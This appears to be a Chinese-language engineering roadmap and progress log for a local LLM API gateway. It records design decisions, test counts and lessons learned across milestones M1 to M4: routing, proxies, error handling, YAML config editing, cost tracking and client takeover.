> 数值比较（`">200k"`）、glob 模型匹配、三种策略组、两阶段求值的第一
> 阶段。**层 0 确实不是特例** —— 它在 `Engine::new` 里被展开成一个全量
> fallback 组加一条兜底规则，求值只有一条路径。
>
> 三个实现时才定下来的判断：
>
> 1. **裸数字（`"200k"`）报错而不是当成相等。** 用户十有八九是想写
>    `">200k"`，而静默当成相等匹配会让规则永远不命中，且完全看不出原因。
> 2. **没写 `max_tokens` 的请求，任何比较都不命中。** 当成 0 会让
>    `"<4k"` 意外匹配上所有省略这个字段的请求 —— 和用户的意思正好相反。
> 3. **`when` 里的未知字段直接拒绝。** 打错一个字段名（`input_token`
>    少个 s）而被静默忽略，会把一条精确规则变成兜底。
>
> 还踩回了一个今天早些时候刚立的规矩：给零 provider 的配置合成了一个空
> 组，于是它又过不了校验了 —— **而「配置合法 ≠ 能转发」正是让 UI 能说出
> 「你还没配上游」的前提**。测试抓住了。
>
> **出站代理、故障转移、并发排队、来源白名单、配置页也都做完了**（同日）：
>
> - **代理**（§3.7）：命名实体、`socks5h` 默认、每个 provider 一个
>   `reqwest::Client`、配不起来就失败不静默直连。
> - **故障转移**（§4.2）：5xx 和 429 换家，其余 4xx 不换（换了也一样被拒，
>   还白白污染那家的健康度）。**尝试链要进客户端看到的那条错误**，不只进
>   事件流 —— 用户看的是他自己终端里的报错。熔断只留两个旋钮，唯一候选时
>   旁路，全熔断时 fail-open。
> - **并发排队**（§4.7）：超限排队而不是拒绝，三个维度取最严。队列有上限，
>   满了才是我们唯一主动拒绝的场景。
> - **来源白名单**（§5.4）：非 loopback 时默认填私网段而不是放行所有；
>   IPv4 映射的 IPv6 对端要能匹配 IPv4 段，否则白名单会莫名全部不命中。
> - **配置页**：按 §0.6 的触发条件显示 —— 只有一个 provider 时不出现健康
>   列（熔断本来就旁路了）和分组，但**模型路由一直在**。
>
> 顺带修了一条自己破坏的承诺：`twcore init` 一度把整个默认 `limits` 块写
> 进配置，**违背 §3.3「六行」**。默认值不再落盘，init 现在写五行。
>
> **两阶段求值也做完了**（同日，M1 的最后一块）。`provider_would_be` 是
> 个环 —— guard 要在请求发出去之前生效，可它的值得等路由决定完才知道。
> 拆开之后有三个结论是写代码时才清楚的：
>
> 1. **阶段二必须在故障转移循环里面。** 转移换了 provider 就得重算，否则
>    「走中转的一律关掉思考」这条规则会恰好在从官方切到中转的那一刻失效
>    —— 而那正是最需要它的时刻。这条有一个做过变异验证的端到端测试：把
>    `phase_two` 挪到循环外面，它会失败。
> 2. **`to` 和 `set` 的累积规则不同。** 首个命中决定 `to`/`deny`，`set`
>    从所有命中的规则累积。去向只能有一个，参数改写是可以叠加的横切策略。
> 3. **阶段二的规则写 `to` 是配置错误，在加载时就挡掉。** 允许的话求值
>    直接成环，而运行时的表现会是一个没人能解释的结果。
>
> `set.thinking: true` 只记录不生效 —— 开启思考需要一个 `budget_tokens`，
> 而我们没有一个合理的值可以替用户编。**只做「关掉」这一个方向**，那是
> 降级场景真正需要的。
>
> **L1 分段测速也做完了**（同日）。§4.6 的第一层：DNS → TCP →（代理
> 握手 →）TLS 各自计时，零成本零副作用。
>
> 决定不复用 reqwest 是这一段最大的一个判断：它把建连整个包起来只给一个
> 总时间，而分段正是这一层的全部价值 —— 「建连 4812ms」说不出任何该修的
> 东西，「DNS 12ms / TCP 4800ms」一眼能看出问题在哪一层。代价是 SOCKS5
> 和 HTTP CONNECT 要自己写，而写完才知道的有四件事：
>
> 1. **SOCKS5 回复里的绑定地址必须读干净。**留在流里的话它会被后面的
>    TLS 当成对方的第一帧，而那个失败看起来和证书问题一模一样。域名形式
>    的绑定地址长度可变，最容易读漏。
> 2. **CONNECT 的响应头要一个字节一个字节读到空行。**多读一个就吃掉了
>    TLS 握手的开头。
> 3. **配了密码也要把「无认证」一起报上去。**代理不要密码时只报 0x02
>    会被拒，而那个失败看起来像密码错了。
> 4. **`socks5` 记「DNS 解析 · 上游」这一段，`socks5h` 不记。**那一段
>    正是会被污染的那一段，值得单独计时；socks5h 下它根本不在本地发生，
>    用一个 0ms 的段来表示「测不到」是在撒谎。所以分段是个列表而不是
>    固定的三个字段，而**缺一段一定要配一句 notes 说明为什么** ——
>    没有那句话，缺一段看起来就像 bug。
>
> 还有一条是产品判断而不是实现细节：**`system` 代理明确说测不了**。
> 它的地址要到建连时才由环境决定，假装直连测一遍给个漂亮数字，测的根本
> 不是用户会走的路。
>
> 错误信息全部翻成能行动的话。证书失败那条**按文字判而不是按 rustls 的
> 枚举判** —— macOS 的平台验证器把一切都塞进 `Other`，按枚举匹配的结果
> 是每一种失败都拿到那句最泛的提示，包括证书只是过期时。
>
> **客户端探测的本地应答做完了**（§4.8，同日）。三条约束里最要紧的是
> 第一条：识别必须窄，宁可漏判。误判一个真实请求并伪造回复是这个功能
> 唯一的严重故障模式 —— 用户会看到一个凭空出现的假答案，且完全无从
> 察觉。所以「不该认出来的」那组测试比「该认出来的」那组重要。
>
> 位置比预想的更靠前：不只在模型准入之前，还在「一个 provider 都没有」
> 那一条之前 —— 那一条也是一种「没有可用上游」，而本地应答本来就不需要
> 上游。这是首次配置时一个意外的好信号：客户端探测被应答了，就说明它
> 确实连上了，界面上那句「已经本地应答了 N 次」比「等第一个请求…」有用
> 得多。
>
> `route` 那个选项也做了，但多一条实现约束：**`passthrough` 不打
> intent 标记**。打了的话，一条 `when: { intent: assistant_internal }`
> 的规则会在用户还没把那类请求配成 `route` 的时候就开始生效，而配置
> 文件里看不出任何线索。
>
> 顺带修了一个静默的显示 bug：`describe_when` 漏了 `provider_would_be`
> 和 `intent`，于是一条只有阶段二条件的规则在界面上显示成「兜底」——
> 因为条件列表为空正是兜底的标记。加了一条会随字段增加而失败的测试。
>
> 还有一个烟测撞出来的问题，性质和上面那些一样：`listen: { addr: ... }`
> （正确写法是 `listen.gateway.port`）被静默丢掉，网关照常起在默认端口
> 8788，日志里一个字都没有。**写错的字段名必须是错误，不是空操作** ——
> `when` 里早就这么做了，配置的其余部分却没有。五个结构体补上
> `deny_unknown_fields`，并且把「不是合法的 YAML」这句错误信息改掉：一份
> 语法完美、只是把 `port` 写成 `prot` 的文件也会走那条错误，而那句话会让
> 用户去找一个根本不存在的语法错误。
>
> 同一次烟测还撞出一个更重的：**控制面起不来时，core 照常跑了下去。**
> unix socket 的路径超过了 `sun_path` 的 104 字节上限，`bind` 失败，而
> 那个失败只 `tracing::error!` 了一行 —— 于是 core 在没有控制面的情况下
> 继续监听数据面。那是 UI 完全够不着的状态：连不上、改不了配置、也关不
> 掉；守护的心跳会失败，然后按重启阶梯反复拉起来，用户看到的是「core
> 连续失败」，真正的原因只在日志里躺着。现在路径长度在起任何东西之前就
> 检查，而控制面结束就让整个进程带着那句话退出。
>
> **错误契约（§4.6.1）补齐了四个缺口**（同日）：
>
> 1. **错误体要用入站方言的原生形状。**之前一律回 Anthropic 那套，而一个
>    OpenAI 客户端收到它会在解析时炸掉。三种方言三套形状，`error.type`
>    的词表也是三套 —— 把 `authentication_error` 塞进 OpenAI 形状里，
>    客户端的错误分支会全部走空。方言在**一个地方**补上（认完身份就把
>    剩下的管线交给内层函数，出错时统一转），不是在每个 return 点：
>    后者只要漏一处，那条路径上的客户端就会收到一个它解析不了的 body。
> 2. **`deny` 是 403 + `permission_error`，不是 400。**请求本身完全合法，
>    是策略不让。混在一起，用户会去改他的请求，而该改的是规则。
> 3. **上游 429 保住 429。**塌成 502 的话客户端会当成「服务器坏了」而不是
>    「该退避了」。
> 4. **流中途断掉要说一声。**这一条最隐蔽：首字节已经发出去了，状态码和
>    响应头都改不了，而**一个戛然而止的 SSE 流和一个正常结束的流在客户端
>    看来长得一模一样** —— 用户会以为模型就答了这么多。唯一还能说话的地方
>    是流本身，所以补一个 `event: error` 帧，同时发失败事件，否则 UI 上
>    那一行会永远停在「进行中」。
>
> 一处有意的简化：`x-thinkwatch-error` 的值用的是 `auth` / `upstream` /
> `rate_limited` / `denied` 这类单词，不是文里举例的 `tw.route.no_provider`
> 那种带命名空间的码。这一层要的是「机器可读、能归类」，而分级命名空间
> 要等错误种类多到需要分级时再引 —— 现在只有六种。
>
> **开机自启那个 `$PATH` 问题也解决了**（§2.4）。两个只有写了才落实的
> 细节：**用 `/usr/bin/env` 读而不是 `echo $PATH`**（fish 把 PATH 存成
> 列表，`echo` 出来是空格分隔、一个冒号都没有的一行）；**只在 PATH 恰好
> 等于 launchd 那个最小集时才去问**（从终端起的进程 PATH 本来就是对的，
> 为它白跑一个会执行整套 rc 文件的 shell 是纯浪费）。
>
> 顺带纠了自己一个错判：本来在测试里断言「PATH 里不该有空格，有就是 fish
> 那个坑」。开发机的 PATH 里就有 `/Applications/VMware Fusion.app/...`
> —— **空格是完全正常的**，fish 那个坑的判据是「有没有冒号」。
>
> 另外错误信息里凡是「找不到」这类，都直接把可能的原因写进
> 错误信息里。找不到和跑失败是两件事，混在一起的代价是查半天 PATH。

> ---
>
> **M1 到此为止**（2026-09-09）。350 个测试，clippy 零警告。下面这份对照
> 是照着 M1 原文一条条过的：
>
> | M1 原文 | 状态 |
> |---|---|
> | 多 provider、路由引擎两阶段求值 | ✅ 条件做了 11 个（原计划 4 个），动作 `to` / `set` / `deny` |
> | select 和 fallback 两种策略组 | ✅ 外加 `load-balance`（带缓存告警） |
> | **Providers、Groups、Routes 三个页面** | ⚠️ **只读**。编辑要等 M2（M2 做了文本模式全量编辑；表单模式按 §3.8 的退路只改标量，见 §3.8 的实现记录） |
> | 托盘菜单 | ✅ |
> | 出站代理（§3.7） | ✅ |
> | L1 和 L2 测速（§4.6） | ✅ |
> | 错误契约（§4.6.1） | ✅ 四个缺口都补了 |
> | 模型目录与 `/v1/models`（§3.9） | ✅ |
> | 分段超时、并发排队、H2 keep-alive（§4.7） | ✅ |
> | 客户端探测的本地应答（§4.8） | ✅ |
> | 菜单栏基础版（§7.4）、监听地址（§5.4）、开机自启（§2.4） | ✅ |
> | 验收标准四条 | ✅ 写成了 `tests/m1_acceptance.rs` |
>
> **那个 ⚠️ 不是偷懒，是顺序问题。**改配置这件事的难点不在表单，在
> §3.8 的双向同步 —— 要在保住注释和格式的前提下只改一个字节，那是 M2
> 的主体（§7 的「M1 拆成两半」已经预告过）。现在先给一个「表单」再回头
> 补同步，就等于先写一遍整文件覆盖的逻辑，然后把它删掉。
>
> **验收标准写成测试**这件事值得单独记一笔。手动清单只会在里程碑那天跑
> 一次，之后每一次改动都可能悄悄破坏它们 —— 而里程碑验收恰恰是最不该
> 「只在那天成立」的东西。
>
> **顺手把 §3.8 那个「要在 M1 第一周就验证」的东西验了**（同日，
> `crates/tw-yaml`）—— 它已经欠着好几周了，而它决定的是 M2 整个表单模式
> 的可行性。结论：**span 精度够用**，退路（只改标量值）用不上。四件只有
> 写了才知道的事：
>
> 1. **解析器给的 span 尾部会一路跑到下一个 token。**照着它替换，
>    `base_url: 'https://x'   # 尾注释` 里那句注释就没了 —— 一个「只改了
>    一个字段」的操作悄悄吃掉了用户写的东西，正是这一节最怕的失败。所以
>    每个标量的区间都要按它自己的风格收尾。
> 2. **saphyr 的 marker 是按 char 数的，不是字节。**中文配置下两者差得
>    很远，而按 char 下标切 `&str` 会 panic —— §9.7 里 cc-switch 栽过
>    两次的那个坑，这次是靠一条中文测试当场抓住的。
> 3. **同名键要拒绝，不能挑一个改。**property test 抓到的：谁生效各家
>    解析器并不一致，而挑一个改的表现会是「改了却没生效」。
> 4. **控制字符必须转义。**自检用的是 saphyr，它比 serde 那条路宽松，
>    于是一个带 DEL 的值能通过自检、写出去却读不回来。**两条路径的宽松度
>    不一样，本身就是一类 bug 的温床** —— M2 真正写盘时，最后那道自检
>    应该直接反序列化成 `Config`，而不是停在 YAML 层。
>
> 一个和本节文字不同的判断：**URL 不加引号。**「宁可多加引号」这条在 `:`
> 上是过度保守 —— `http://a:8788` 本来就是合法纯量，而 `base_url` 是被改
> 得最多的字段，每次编辑都凭空多一对引号，正是这一节想避免的 diff 噪音。
> 按 YAML 的真实规则判即可，判错了还有自检兜着。YAML 1.1 的
> `yes/no/on/off` 仍然加引号：实测我们自己这套（saphyr + serde_yaml_ng）
> 都是 1.2 不需要，但**配置文件不止我们在读**。
>
> 三层防护都到位了，其中第三层在运行时而不只是测试时：改完重新解析，
> 对不上就拒绝返回。property test 跑了 2779 次随机补丁。
>
> 接下来是 §11 那道关卡：**过去两周我每天都在用它吗？**判据是行为不是
> 想法，而现在还答不了 —— 因为它今天才第一次能用。

多 provider。路由引擎（§3.4）两阶段求值，先做 `model` / `client` / `input_tokens` / `cache` 四个条件加兜底，动作先做 `to`。select 和 fallback 两种策略组。Providers、Groups、Routes 三个页面。托盘菜单。

**出站代理**（§3.7）：有些上游不走代理就连不上，晚了整个链路都没法在真实环境验证。每 provider 一个独立 Client，`reqwest` 开 `socks` feature，`socks5h` 排在下拉框第一位。

**L1 和 L2 测速**（§4.6）：握手分段计时和 `GET /v1/models`，零成本。

**错误契约**（§4.6.1）：七种失败源各自的方言原生 error body、`x-thinkwatch-error` 头、`[ThinkWatch]` 前缀。这个必须在这一步定死，因为后面每加一个功能都会多一种失败源。

**模型目录与 `/v1/models`**（§3.9）：`resolve_allowed_models()` 这个单点函数、按方言的三种响应结构、按方言自动过滤的默认行为。**这一步就要做对「列表即承诺」**——它和路由是同一批代码，晚做会让准入检查散落到各处，那正是 one-api 和 new-api 都栽过的坑。

**分段超时与并发排队**（§4.7）：超时设错会掐断长任务，并发没上限时一个失控脚本就能打爆额度。**HTTP/2 的 keep-alive PING 三参数也在这里**（§4.7）——挂本地代理的用户几乎必踩，而 hyper 默认不开。

**客户端探测请求的本地应答**（§4.8）：只做 A 类（健康检查、预热），十几行判定加一个伪造响应生成器。放这一步是因为它**让离线时客户端不报错**，而 M1 正是开始长时间真实使用的阶段。

**菜单栏基础版**（§7.4）：单行文本，先把渲染链路跑通并测 CPU 开销。**监听地址选择**（§5.4）及其联动。

**开机自启**（§2.4）也在这一步：`tauri-plugin-autostart` 的 LaunchAgent 模式、`--autostart` flag 静默启动、运行时切 activation policy、单实例插件。

**验收**：Opus 走官方、Haiku 走中转；经代理访问官方成功而本地 Ollama 不受影响；一个 6 分钟的长任务不被中间层掐断；上游返回 401 时 Claude Code 里显示的是可读的、能看出来自哪一层的错误。

### M2 — 配置双向同步（3–4 周）

**第一周先验证 span-to-patch 层**（§3.8）：确认 YAML 解析器的节点位置精度够不够支撑「只替换一个标量值、其余字节不动」。精度不够就把表单模式降级为只改标量，新增删除引导到文本模式——**表单模式是奢侈品，文本模式加校验加回滚已经覆盖真实需求**。

然后是写入指纹防回环、乐观并发的冲突检测、三级热重载、变更历史与回滚、schema 版本迁移。CLI 的 `config` 子命令走同一套 API。Monaco 与外部改动的冲突 UI。

**测试护栏是这一步的验收项，不是可选项**（§3.8）：round-trip property test、覆盖注释锚点多行标量的语料、以及写入前「patch → 重新解析 → 比对」的运行时护栏。

**验收**：UI 改一个 base_url，配置文件里只有那一行变了，注释格式原样保留；手改文件 UI 三秒内反映，写个语法错误进去旧配置继续服务且定位到出错行；CLI 和 UI 改同一字段效果一致；改坏能一键回滚；property test 全绿。

> **M2 做完了**（2026-09-09）。465 个测试。逐条对照 M2 原文：
>
> | M2 原文 | 状态 |
> |---|---|
> | 第一周先验证 span-to-patch 层 | ✅ 结论是精度够用，退路没用上 |
> | 写入指纹防回环 | ✅ |
> | 乐观并发的冲突检测 | ✅ 409 带上两个版本号 |
> | 三级热重载 | ✅ 热 + 温。**冷这一级还不存在**（没有存储路径这类字段，M3 才有） |
> | 变更历史与回滚 | ✅ |
> | **schema 版本迁移** | ⬜ **有意不做**，见下 |
> | CLI 的 `config` 子命令走同一套 API | ✅ |
> | Monaco 与外部改动的冲突 UI | ✅ 冲突 UI 做了，**Monaco 换成了 textarea**，见下 |
> | 三层测试护栏 | ✅ |
>
> 六件只有写了才知道的事：
>
> 1. **解析器给的 span 尾部会跑到下一个 token**，照着替换会吃掉行尾注释。
> 2. **saphyr 的 marker 按 char 计，不是字节**（中文配置下按它切 `&str`
>    会 panic —— §9.7 那个坑的第三次现身）。
> 3. **同名键要拒绝，不能挑一个改**（property test 抓到的）。
> 4. **监听要盯目录不盯文件**：编辑器保存是「写临时文件再 rename」，
>    盯文件的监听在第一次保存之后就永久失效，而且不报任何错。
> 5. **并发闸门不能跟着配置一起换**：它握着正在跑的请求的通行证，换掉
>    的话那一瞬间的实际并发可以到上限的两倍。
> 6. **Client 要尽量复用**：每次重载都重建，等于把每个上游的连接池连同
>    已经握好的 TLS 一起扔掉。判据只看代理相关的字段。
>
> **schema 迁移有意不做。**现在只有 version 1，没有任何东西可迁。一个
> 没有真实用例、没有真实测试的迁移框架，比没有框架更糟 —— 它会给人
> 「这条路已经通了」的错觉，而第一次真要迁的时候还是要重写。现在有的
> 是：`version` 字段、加载时的检查、以及 `SchemaTooNew` 那句带升级提示
> 的错误。**第一次真要改 schema 时再建，那时才知道它该长什么样。**
>
> **Monaco 换成了 textarea。**几 MB 的依赖换来的是语法高亮，而文本模式
> 真正解决的问题是「改完之后会不会覆盖掉别人的改动」—— 那是版本号的事，
> 不是编辑器的事。冲突 UI 一条没少：外面改了而你没动草稿就跟着走，你正在
> 写就挂横幅并**给两个选择**（丢掉我的 / 保留我的覆盖过去）。替他决定哪
> 边该留是不对的 —— 两边都是真实的改动，只有他知道。
>
> 三条验收标准都在真实 twcore 上跑过：改一个 base_url 之后 `diff` 只有
> 一行、注释格式全在；手改文件 1.5 秒生效；写个 `base_ur` 进去报「字段
> 错误（第 15 行）」而旧配置继续服务；改端口两秒内旧端口不通新端口通。
>
> ---

### M3 — 观测与计价（3–4 周）

SQLite 持久化、blob 存储、GC、磁盘不足的降级（§8）。Requests 详情抽屉四个标签页。**定价表**（§4.3.0）：内置 LiteLLM 快照、模型名归一化、成本三态建模、成本旁标价目表日期、用户覆盖层。**发版前的双源交叉校验要一起把 CI 建起来**——那是挡住「打包了错数据」的唯一手段。被动统计的分位数与 EWMA。Dashboard 实时图。菜单栏完整版（位图渲染）。L3 模型测速及其成本确认框。

**订阅额度的被动采样**（§4.3.2）也在这一步：解析 `anthropic-ratelimit-unified-*` 和 `x-codex-*` 响应头，落库、进菜单栏、驱动限流预警和恢复。**它和成本面板是同一件事的两面**——按量付费用户看金额，订阅用户看百分比，两种人格共用同一块 UI。零成本，只是解析我们本来就收到的头。

**§0.6 的触发条件机制**也在这里落地：Dashboard 和各配置页按 provider 数量、客户端数量决定显示什么。这一步做是因为 M3 之前只有一个 provider 的场景还没真正出现过。

企业版的**灰度切换**在这期间做：先切一个协议观察一周，再全切，最后删旧代码（§9.4 第 4 步）。

**顺带做观察态里最便宜的那一条**（§5.0）：出站密钥检测。一组正则就够，不需要 `tw-redact` 整套。这样「过去 7 天有 3 个请求把你的 key 发给了 relay-cn」这类证据**从这一步就开始攒**，而不是等到 M5 才启动说服链路。

**验收**：能回答「昨天花了多少钱」「哪家 TTFT 最差」「缓存省了多少」；混入订阅型上游后金额不失真；菜单栏花费从两位数跳三位数时右边图标不移动；**实测 UI 关窗后的常驻内存**，据此定隐藏还是销毁 webview（§2.4）。

> **M3 进行中**（2026-09-09）。565 个测试。对照 M3 原文：
>
> | M3 原文 | 状态 |
> |---|---|
> | SQLite 持久化、GC、磁盘不足的降级 | ✅ |
> | blob 存储 | ✅ |
> | Requests 详情抽屉四个标签页 | ✅ 四个 |
> | 定价表（内置快照、归一化、三态、日期、覆盖层） | ✅ |
> | 发版前的双源交叉校验 CI | ✅ 机制建好了，**但那份对照表还没被人核对过** |
> | 被动统计的分位数 | ✅。**EWMA 有意不做** —— 见下 |
> | Dashboard | ✅ 含实时图 |
> | 菜单栏完整版 | ✅ |
> | L3 测速及成本确认框 | ✅ |
> | 订阅额度的被动采样 | ✅ |
> | §0.6 的触发条件机制 | ✅ |
> | 出站密钥检测 | ✅ 连同 §5.0 的三态 |
>
> body 那条路走的是**有界通道而不是直接调用**：直接调用意味着文件 I/O
> 跑在转发那条路上，一次慢磁盘写就变成一次慢请求。满了就丢 —— 丢的是
> 一条观测记录，而等它是在惩罚真实用户。响应体在内存里的上限（256 KB）
> 和落盘的上限（4 MB）是两个数：前者在飞的请求越多乘得越狠。
>
> 八件写的时候才知道的：
>
> 1. **成本三态在数据库层就要成立。**`cost_micros` 是 `Option`，
>    「没有价格」和「花了 0 元」是两行不同的记录。塌成 0 的话，总额会
>    悄悄偏低而没有任何人发现。
> 2. **金额用整数微分。**浮点相加一万次之后的尾差会让「今日花费」和
>    「逐条相加」对不上，而那种对不上没法解释给用户听。
> 3. **百分位用最近秩法。**两个样本的 p95 应该是较大那个，而
>    `(n-1)·p/100` 会给出较小那个 —— 小样本下的 p95 因此永远偏乐观。
>    最近秩法还有一条更实际的好处：**返回的永远是一个真实发生过的值**，
>    用户能在请求列表里找到它。
> 4. **「Bedrock 的单价和直连一样」是错的。**本来想拿它当别名（数据集
>    里有些模型只有 Bedrock 那个键），写了一条覆盖整份快照的检查当场
>    证伪：输入输出价一样，**缓存价差 17%**。所以那条兜底算出来的成本
>    一律标成估算 —— 给一个带波浪号的数字比给一个空白有用，而假装它
>    精确就是那种「看起来很确定的错数字」。
> 5. **按字节切 `&str` 第三次现身。**这次在模型名归一化里 —— 中转站
>    完全可能起一个中文名字。§9.7 那条清单该加一句：**任何一个吃用户
>    输入的字符串函数，都要有一条多字节测试**，而不是等它 panic。
>
> 6. **请求体和数据库的权限之前是敞开的。**真机烟测撞出来的：落盘的
>    `1.req` 是 0644。这些文件里有用户的 system prompt、代码、有时还有
>    他自己粘进去的密钥 —— 和 config.yaml 一样敏感，而它们比 config.yaml
>    多得多。§5.4 那条「0700 的 socket，权限就是认证」我在那一层想到了，
>    在这一层没有。连 `data.db` 的 `-wal` 兄弟文件一起收（未提交的数据
>    就在那里面，只收主文件等于没收）。
> 7. **落盘的 body 不脱敏，出门时才脱。**那是用户自己的请求、在他自己
>    的机器上，而排查问题时「我的 key 到底发出去了没有」正需要原样。
>    脱敏发生在它离开进程的时候（详情接口）—— 那才是 §9.7 说的那条线。
> 8. **`message_start` 不算首 token。**上游收到请求立刻就发它，拿它当
>    TTFT 会让所有上游看起来一样快，而那正好抹掉了这次测速的全部信息。
>
> §9.7 那份清单该加两句：**任何一个吃用户输入的字符串函数都要有一条
> 多字节测试**（这一轮又栽了一次），以及**任何一个落盘的路径都要在测试
> 里断言权限**（这一轮栽了三处）。两条都是「想到了但没在那一层想到」，
> 而清单存在的意义就是不必每次重新想。
>
> **EWMA 有意不做。**§4.6 说它是给 `url-test` 策略组用的，而
> `url-test` 还不存在（现在只有 fallback / select / load-balance）。
> 一个没有消费者的指标就是一个没人读的数字，而它会以「已经有了」的姿态
> 存在很久 —— 等 `url-test` 真的要做的时候，再按那时的需要建。分位数
> 已经回答了「通常多快、最糟多慢」，那是界面上真正需要的。
>
> **双源交叉校验那个 ✅ 要打个折扣。**机制建好了：`verified.yaml` 里是
> 一份人工核对过的价格（单位写成每百万 token 的美元，和厂商定价页上印的
> 一样），一条测试逐条比对它和内置快照，对不上就构建失败。但**那份文件
> 现在还没有被人核对过** —— 里面的数字是从快照里抄下来的，所以那条比对
> 只能抓住「快照漂了」，抓不住「快照一开始就错了」。文件里有一个
> `pending_human_verification: true` 说着这件事，代码里有一条测试盯着
> 那个标志。
>
> 和 §4.3.0 文字不同的一处：那里写的是「CI 拉取官方定价页逐条比对」。
> 没那么做 —— 抓一个会改版的 HTML 页面，会让 CI 在厂商换个 div 的那天
> 变红，而那种红和「价格真的错了」长得一模一样，**一个天天误报的检查
> 第二周就没人看了**。换成「人工核对一次、日期写下来、机器盯着别漂」：
> 机器管它擅长的（一个字节都不许变），人管他擅长的（这个数字对不对）。
>
> **M3 的验收标准现在能答上三条了**（同日）：
>
> - 「昨天花了多少钱」「哪家 TTFT 最差」「缓存省了多少」—— 前两个直接
>   有，第三个补了一列。**按上游分的延迟是一张单独的表**：「哪个模型慢」
>   的下一步是换模型，「哪家上游慢」的下一步是换上游，合成一张两个都
>   答不好。
> - **「混入订阅型上游后金额不失真」**是这一批里最要紧的一条。订阅制的
>   边际成本是零，按 API 价目表乘出来的数字是纯虚构的，而它会混进「今日
>   花费」，把一个诚实的面板变成一个编出来的。provider 上的 `billing`
>   **不写就自动判** —— 响应头里报过额度的就是订阅型，那个信号一直在我们
>   手上，不该变成一个用户要填的字段（§0.6）。计费方式**存在请求那一行
>   上**，不是事后查配置：配置随时会热重载，而一条三天前的记录该按它当时
>   那家的算。
>
> 那条自动判定有一个**已知边界，测试专门钉住了它**：每次进程启动之后，
> 打给一家订阅上游的第一个请求会被按量计价 —— 那时还没见过它的额度头。
> 没有更好的办法：额度头只在响应里，而计价发生在响应之后；想提前知道
> 只能主动探测，而 §4.3.2 明确否掉了那条路。在乎那一条记录的人，配置里
> 写一行 `billing: subscription` 就没有歧义了。
>
> **验收剩下的两条也做完了：**
>
> 宽度抖动那条现在有两个断言：画布尺寸不随内容变，以及**文字的右边缘不
> 随位数变**。只测前者是不够的 —— 一个居中或左对齐的渲染同样能通过它，
> 而它右边的图标照样会跳。
>
> **常驻内存量出来了，而且结论和默认实现相反。**同一台机器、同一个工具、
> 同一种跑法：
>
> | | 窗口开着 | 关窗 40 秒后 | 差 |
> |---|---|---|---|
> | 隐藏 | 214 MB | 214 MB | **−0.0 MB** |
> | 销毁 | 213 MB | 127 MB | **−86 MB** |
>
> **隐藏一个字节都不放。**那 86 MB 全是 WebKit 的三个 XPC 进程，而这是
> 一个用户开着一整天、一天点开两三次的菜单栏应用。所以关窗改成销毁，
> 代价是重开时重新加载一次页面（几百毫秒），并且开窗时要先把最近的历史
> 填进实时列表 —— 不填的话用户看到一片空白，而请求明明一直在跑。
>
> 还量到一个会骗人的细节：**WebKit 分两步放** —— 6 秒时掉 47 MB，40 秒
> 时才掉完剩下的 36 MB（macOS 缓存 WebContent 进程备用）。「关窗之后
> 立刻看内存没降多少」因此是个错误的观察。
>
> 而这条最该记的是**怎么量错的**：先用 osascript 点关闭按钮量了两次，
> 两次都是无效的 —— 辅助访问没授权，那个键根本没送到应用，量的是「窗口
> 一直开着」。差点据此下结论。改成在进程内部驱动（`--measure-memory`）
> 之后，两组数字才第一次真的可比。**一个需要用户授权才能跑的测量方法，
> 在它没授权的时候不会报错，只会给你一个看起来正常的错数字。**
>
> 一处和文字不同的取舍：§4.3.2 说菜单栏对订阅用户显示百分比。实现时
> 发现「有额度头」本身就是「这是个订阅账号」的判据 —— 不需要用户配置
> 任何东西，也不需要我们猜。所以那一块的逻辑是「有额度就显示额度，
> 没有就显示金额」，而不是一个开关。
>
> ---

### M4 — 接管与静态扫描（4–5 周）

客户端检测、一键接管、还原。五个客户端各自的字段级合并——TOML edit、JSON 保序、符号链接处理、哨兵标记各是一套，这是这个里程碑最费时间的部分。

**接管后的生效性验证与诊断**（§7.11）也在这里：观察窗口加优先级链检查。**这是接管功能能不能真正好用的分水岭**——改完文件就宣布成功，和确认请求真的过来了，是两种产品。

路由试算。Sessions 聚合视图。健康检查与熔断。

**静态扫描**（§5.3）一起做，共用同一套目录发现和文件监听。

**MCP 与 skill 的清单和同步也在这一步**（§7.12）。它是简化版：打开页面时扫一次、结果只在内存、点矩阵格子执行一次复制。写入复用接管那套机制（字段级合并、备份、diff、还原），所以增量很小。

**开工前先定一件事：要监听哪些目录。** 项目级 `.claude/` 散落全盘，无界的 FSEvents 监听既是性能问题也和 §4.5 的空闲目标冲突——先划定范围（比如只监听用户显式添加的项目目录），再动手。

**验收**：新机器装完三分钟内五个客户端全部接管且能一键还原；往一个 skill 里塞零宽字符能被检出并定位到行；只报告不删除；空闲时 CPU 仍然接近零。

> **M4 进行中**（2026-09-09）。798 个测试。对照 M4 原文：
>
> | M4 原文 | 状态 |
> |---|---|
> | 客户端检测、一键接管、还原 | ✅ 五个客户端（Claude Code / Codex / opencode / Zed / Aider）。JSON 自己扫 span，顺带支持 JSONC；TOML 走 `toml_edit`；YAML 走 tw-yaml |
> | 接管后的生效性验证与诊断 | ✅ 观察窗口靠 `client_hint` 的最后出现时间；优先级链六条各查一遍 |
> | 路由试算 | ✅ 连「为什么没走那条」和「候选此刻正熔断着」一起报 |
> | Sessions 聚合视图 | ✅ 上下文增长曲线 + 每轮成本瀑布 |
> | 健康检查与熔断 | ✅ M1 就在了（`tw-gateway::Health`），这一步只是把它接进试算和界面 |
> | 静态扫描 | ✅ 四类检测；对着本机实扫零误报 |
> | MCP 与 skill 清单 | ✅ 矩阵、同名不同配置标记、hook 与 skill 清单、点格子复制/移除。只往**见过真实样本**的四个客户端里写 |
> | 先定要监听哪些目录 | ✅ 定死了，写在 §5.3。持续监听也做了：只认几种后缀、不递归、首次扫描不算「新出现」 |
>
> **三处和原文不同的取舍**（都记在对应小节里）：
>
> 1. **Continue 和 Gemini CLI 从「能接管」挪成「只给指引」**（§7.12）。前者要往 YAML 列表里插条目，后者只读环境变量。宁可少接管一个，也不写一段自己没把握的结构。
> 2. **「五个客户端各自的字段级合并」实际是三套解析器，不是五套。**JSON 一套覆盖 Claude Code / opencode / Zed，TOML 一套给 Codex，YAML 一套给 Aider。原文按客户端数估工，估高了。
> 3. **Codex 不写 `env_key`。**实测它不配任何密钥也照发请求，而 `env_key` 指向一个没 export 的变量反而会让它起不来（§7.11）。
>
> **四条验收标准全部答上**：零宽字符能检出并定位到行 ✅；只报告不删除 ✅（有一条测试直接读产品代码，确认里面压根没有删除路径）；接管与一键还原 ✅（round-trip 测试要求还原后**字节完全一致**）；空闲时 CPU 接近零 ✅（实测数字在 §5.3）。
>
> 「新机器装完三分钟内五个客户端全部接管」这一条没法在这台机器上验 ——
> 它装了三个，另外两个（Zed、Aider）没装。**那一半仍然是「字段查证过，
